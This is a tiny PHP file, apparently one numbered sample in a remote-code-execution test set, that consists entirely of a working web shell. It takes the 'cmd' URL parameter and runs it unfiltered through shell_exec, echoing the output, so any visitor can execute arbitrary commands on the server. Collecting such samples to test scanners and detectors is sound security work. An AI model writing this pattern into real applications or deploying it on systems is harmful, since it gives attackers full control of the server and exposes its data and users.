<?php
// RCE test variation #1114
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>